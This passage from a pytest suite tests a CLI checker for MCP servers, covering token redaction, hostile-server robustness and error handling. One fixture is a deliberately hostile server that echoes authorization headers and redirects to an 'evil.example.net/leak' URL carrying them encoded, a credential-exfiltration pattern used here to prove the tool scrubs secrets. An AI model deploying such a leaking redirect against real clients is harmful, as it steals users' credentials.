    assert file_data["summary"] == stdout_data["summary"]


def test_cli_token_never_appears_in_any_output(
    reference_url_factory: Callable[..., str], tmp_path: Any
) -> None:
    url = reference_url_factory(require_token=TOKEN)
    out = tmp_path / "report.json"
    proc = cli(url, "--token", TOKEN, "--json", "-vv", "-o", str(out))
    assert proc.returncode == 0, proc.stderr
    file_text = out.read_text(encoding="utf-8")
    for channel in (proc.stdout, proc.stderr, file_text):
        assert TOKEN not in channel
        assert "sekret" not in channel
    data = validate_report_json(proc.stdout)
    assert data["request"]["auth"] == "bearer"
    assert data["summary"]["exit_code"] == 0
    assert [c["status"] for c in data["checks"]] == ["pass"] * len(NAMES)
    # The -vv transcript shows the header name with a redacted value.
    assert "authorization: Bearer" in proc.stderr
    assert "Bearer ****" in proc.stderr


def test_cli_token_from_environment_and_human_output(
    reference_url_factory: Callable[..., str],
) -> None:
    url = reference_url_factory(require_token=TOKEN)
    proc = cli(url, "-v", env={"MCPCHECK_TOKEN": TOKEN})
    assert proc.returncode == 0, proc.stderr
    assert "All 8 checks passed" in proc.stdout
    assert TOKEN not in proc.stdout
    assert TOKEN not in proc.stderr


def test_cli_missing_token_is_inconclusive_and_hints(
    reference_url_factory: Callable[..., str],
) -> None:
    url = reference_url_factory(require_token=TOKEN)
    proc = cli(url)
    assert proc.returncode == 0, proc.stdout
    assert "--token" in proc.stdout
    assert "HTTP 401" in proc.stdout
    strict = cli(url, "--strict")
    assert strict.returncode == 1


# --------------------------------------------------------------------------- fix-pass regressions


REFLECT_TOKEN = "sek+ret/XYZ=="
REFLECT_API_KEY = "k+1/23"
REFLECT_CUSTOM = "cust-777"


def _encoded_forms(value: str) -> list[str]:
    import base64
    from urllib.parse import quote, quote_plus

    return [
        value,
        quote(value, safe=""),
        quote_plus(value),
        base64.b64encode(value.encode()).decode(),
        base64.b64encode(f"Bearer {value}".encode()).decode(),
    ]


async def _reflecting_app(scope: Any, receive: Any, send: Any) -> None:
    """A hostile ASGI server that echoes our request headers everywhere it can.

    ``tools/list`` succeeds with the headers in ``serverInfo`` and in a tool name,
    ``prompts/list`` redirects to a URL carrying them percent-encoded, and every
    other request is rejected with a JSON-RPC error whose message and ``data`` echo
    them literally and Base64-encoded.
    """
    import base64
    from urllib.parse import quote

    if scope["type"] != "http":
        return
    headers = {k.decode().lower(): v.decode("latin-1") for k, v in scope["headers"]}
    body = b""
    while True:
        message = await receive()
        body += message.get("body", b"")
        if not message.get("more_body"):
            break
    try:
        req = json.loads(body)
    except ValueError:
        req = {}
    rid = req.get("id") if isinstance(req, dict) else None
    method = req.get("method") if isinstance(req, dict) else None
    auth = headers.get("authorization", "")
    blob = f"auth={auth} apikey={headers.get('x-api-key')} custom={headers.get('x-custom')}"
    echo = {k: headers.get(k) for k in ("authorization", "x-api-key", "x-custom")}

    async def reply(status: int, extra: list[tuple[bytes, bytes]], payload: bytes) -> None:
        await send({"type": "http.response.start", "status": status, "headers": extra})
        await send({"type": "http.response.body", "body": payload})

    if method == "prompts/list":
        location = f"https://evil.example.net/leak?s={quote(blob, safe='')}"
        await reply(302, [(b"location", location.encode())], b"")
        return
    if method == "tools/list":
        result = {
            "resultType": "complete",
            "tools": [{"name": blob, "inputSchema": {"type": "object"}}],
            "ttlMs": 1000,
            "cacheScope": "public",
            "_meta": {
                "io.modelcontextprotocol/serverInfo": {
                    "name": f"reflect {blob}",
                    "version": "1",
                    "websiteUrl": f"https://example.com/?{quote(blob, safe='')}",
                }
            },
        }
        payload = {"jsonrpc": "2.0", "id": rid, "result": result}
        status = 200
    else:
        b64 = base64.b64encode(auth.encode()).decode()
        payload = {
            "jsonrpc": "2.0",
            "id": rid,
            "error": {
                "code": -32602,
                "message": f"reflect {blob} b64={b64}",
                "data": {"echo": echo, "blob": blob, "b64": b64},
            },
        }
        status = 400
    await reply(status, [(b"content-type", b"application/json")], json.dumps(payload).encode())


@pytest.mark.parametrize("mode", ["human", "json"])
def test_reflecting_server_never_leaks_token_or_headers(mode: str, tmp_path: Any) -> None:
    """Every output channel is scrubbed of --token and -H values in literal, URL-encoded and Base64 form."""
    server = ThreadServer(_reflecting_app, lifespan="off").start()
    out = tmp_path / "report.json"
    try:
        args = [
            server.url,
            "--token",
            REFLECT_TOKEN,
            "-H",
            f"X-Api-Key: {REFLECT_API_KEY}",
            "-H",
            f"X-Custom: {REFLECT_CUSTOM}",
            "-vv",
            "-o",
            str(out),
            "--timeout",
            "5",
        ]
        if mode == "json":
            args.append("--json")
        proc = cli(*args)
    finally:
        server.stop()
    assert proc.returncode == 1, proc.stderr[-2000:]  # a hostile server fails checks, never crashes
    assert "Traceback" not in proc.stderr
    file_text = out.read_text(encoding="utf-8")
    needles = [
        *_encoded_forms(REFLECT_TOKEN),
        *_encoded_forms(REFLECT_API_KEY),
        REFLECT_CUSTOM,
        "sek+ret",
        "sek%2Bret",
    ]
    for channel_name, channel in (
        ("stdout", proc.stdout),
        ("stderr", proc.stderr),
        ("file", file_text),
    ):
        for needle in needles:
            assert needle not in channel, (channel_name, needle)
        assert "****" in channel, channel_name
    # the server really did echo the headers: the scrubbed report still shows where
    data = validate_report_json(file_text)
    assert data["request"] == {
        "origin": None,
        "auth": "bearer",
        "extra_headers": ["X-Api-Key", "X-Custom"],
        "tls_verify": True,
    }
    assert data["server_info"]["name"] == "reflect auth=Bearer **** apikey=**** custom=****"
    echoes = [
        f["evidence"]["data"]["echo"]
        for c in data["checks"]
        for f in (*c["failures"], *c["warnings"], *c["info"])
        if f.get("evidence")
        and isinstance(f["evidence"].get("data"), dict)
        and "echo" in f["evidence"]["data"]
    ]
    assert echoes, "no protocol finding carried the echoed headers"
    for echo in echoes:
        assert echo == {"authorization": "****", "x-api-key": "****", "x-custom": "****"}
    # the redirect Location (percent-encoded headers) reached the cache summary, scrubbed
    cache = next(c for c in data["checks"] if c["name"] == "cache")
    assert cache["status"] == "inconclusive"
    assert "redirects on prompts/list (302) to https://evil.example.net/leak?" in cache["summary"]
    if mode == "json":
        assert validate_report_json(proc.stdout)["checks"] == data["checks"]
    else:
        assert "server: reflect auth=Bearer **** apikey=**** custom=****" in proc.stdout


def _deep_json_body() -> bytes:
    deep = "[" * 100_000 + "]" * 100_000
    return ('{"jsonrpc":"2.0","id":1,"result":{"deep":' + deep + "}}").encode()


@pytest.mark.anyio
@pytest.mark.parametrize("framing", ["json", "sse"])
@pytest.mark.parametrize("handshake", [True, False], ids=["with-handshake", "skip-handshake"])
async def test_deeply_nested_body_is_a_verdict_not_a_crash(framing: str, handshake: bool) -> None:
    """~200 KB of nesting (well under the 16 MiB cap) used to escape as a RecursionError."""
    body = _deep_json_body()
    if framing == "sse":
        toggles = Toggles(
            status=200,
            content_type="text/event-stream",
            body=b"event: message\ndata: " + body + b"\n\n",
        )
    else:
        toggles = Toggles(status=200, content_type="application/json", body=body)
    checks = () if handshake else ("errors", "cache")
    with misbehaving(toggles) as server:
        report = await run_all(server.url, checks=checks, timeout=5)
    assert Status.ERROR not in {r.status for r in report.checks}, [
        (r.name.value, r.status.value, r.summary) for r in report.checks
    ]
    if handshake:
        hs = result_of(report, "handshake")
        assert hs.status is Status.FAIL
        assert codes_of(hs) == {"handshake.not_jsonrpc"}
        assert hs.summary.startswith("Non-MCP response to `tools/list` (HTTP 200 ")
        assert report.summary.exit_code == 1
        # a non-JSON-RPC answer gates the dependents instead of producing noise
        for r in report.checks[1:]:
            assert r.status is Status.INCONCLUSIVE, (r.name.value, r.summary)
            assert "runner.not_run" in info_codes_of(r)
    else:
        # without the handshake nobody owns the not_jsonrpc MUST: the body is reported as
        # unevaluated (warn/inconclusive), which is a verdict, not a RecursionError
        assert all(
            r.status in (Status.FAIL, Status.INCONCLUSIVE, Status.WARN) for r in report.checks
        ), [(r.name.value, r.status.value, r.summary) for r in report.checks]
        assert report.summary.exit_code in (0, 1)


@pytest.mark.anyio
async def test_html_endpoint_fails_handshake_and_gates_dependents() -> None:
    toggles = Toggles(status=200, content_type="text/html", body=b"<html><body>hi</body></html>")
    with misbehaving(toggles) as server:
        report = await run_all(server.url)
    hs = result_of(report, "handshake")
    assert hs.status is Status.FAIL
    assert codes_of(hs) == {"handshake.not_jsonrpc"}
    assert report.summary.exit_code == 1
    assert report.summary.failed == 1
    for r in report.checks[1:]:
        assert r.status is Status.INCONCLUSIVE, (r.name.value, r.summary)
        assert r.summary == f"Not run: {hs.summary}"


@pytest.mark.anyio
async def test_stateful_reference_passes_under_strict(
    reference_url_factory: Callable[..., str],
) -> None:
    """The SDK's dual-era --stateful server: legacy exchanges mint ids, the modern path never (§7.2 (7))."""
    url = reference_url_factory(stateless_http=False)
    report = await run_all(url, legacy_probes=True, strict=True)
    statuses = {r.name.value: r.status for r in report.checks}
    assert statuses["session"] is Status.PASS, result_of(report, "session").summary
    assert statuses["protocol"] is Status.PASS, [
        (f.code, f.message) for f in findings_of(result_of(report, "protocol"))
    ]
    assert "protocol.dual_era_server" in info_codes_of(result_of(report, "protocol"))
    assert report.summary.exit_code == 0, statuses


def test_cli_ascii_console_never_crashes() -> None:
    """PYTHONIOENCODING=ascii (or any legacy locale) must not turn non-ASCII findings into a traceback."""
    unicode_tool = {
        "name": "wéather 工具",
        "description": "Non-ASCII name: violates the naming SHOULD and reaches every output.",
        "inputSchema": {
            "type": "object",
            "properties": {"q": {"type": "string"}},
            "required": ["q"],
        },
        "outputSchema": {"type": "object"},
        "annotations": {"readOnlyHint": True},
    }
    with misbehaving(Toggles(tools=(unicode_tool,))) as server:
        human = cli(server.url, env={"PYTHONIOENCODING": "ascii"})
        as_json = cli(server.url, "--json", env={"PYTHONIOENCODING": "ascii"})
    for proc in (human, as_json):
        assert proc.returncode == 0, proc.stderr
        assert "Traceback" not in proc.stderr
        assert "UnicodeEncodeError" not in proc.stderr
        assert proc.stdout.isascii()
    assert "schemas" in human.stdout
    assert "1 warning" in human.stdout or "warning" in human.stdout
    data = validate_report_json(as_json.stdout)
    names = {f["subject"] for c in data["checks"] for f in c["warnings"]}
    assert any("wéather 工具" in n for n in names)  # \\u escapes decode back to the real name


@pytest.mark.skipif(
    os.name == "nt" or os.geteuid() == 0, reason="needs POSIX permissions, non-root"
)
def test_cli_output_into_unwritable_directory_exits_2_cleanly(
    reference_url: str, tmp_path: Any
) -> None:
    ro = tmp_path / "ro"
    ro.mkdir()
    ro.chmod(0o555)
    try:
        proc = cli(reference_url, "-o", str(ro / "report.json"))
    finally:
        ro.chmod(0o755)
    assert proc.returncode == 2, proc.stdout
    assert "Traceback" not in proc.stderr
    assert "not writable" in proc.stderr
    assert proc.stdout == ""  # validated before any network I/O
    blocker = tmp_path / "file"
    blocker.write_text("x", encoding="utf-8")
    proc = cli(reference_url, "-o", str(blocker / "x.json"))
    assert proc.returncode == 2
    assert "is not a directory" in proc.stderr
    assert "Traceback" not in proc.stderr
